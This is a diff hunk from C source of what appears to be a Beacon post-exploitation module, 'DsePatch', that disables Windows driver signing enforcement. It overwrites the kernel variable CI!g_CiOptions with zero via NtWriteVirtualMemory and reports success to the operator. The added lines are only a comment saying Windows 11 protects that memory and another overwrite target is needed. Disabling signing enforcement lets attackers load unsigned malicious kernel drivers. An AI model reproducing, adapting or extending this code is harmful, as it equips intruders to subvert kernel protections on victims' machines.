@@ -211,6 +211,15 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions = 0x%x\n" ) ), Opt );
 
 						/*
+						 * Windows 11 does _NOT_ like this. For some reason, they
+						 * changed it in Win11 to protect the bloody section from
+						 * R/W.
+						 *
+						 * :(.
+						 *
+						 * Gotta find another place to overwrite.
+						**/
+
 						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &( DWORD ){ 0x0 }, sizeof( DWORD ), NULL ) ) 
 						{
 							BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch disabled driver signing enforcement." ) ), 0x0 );
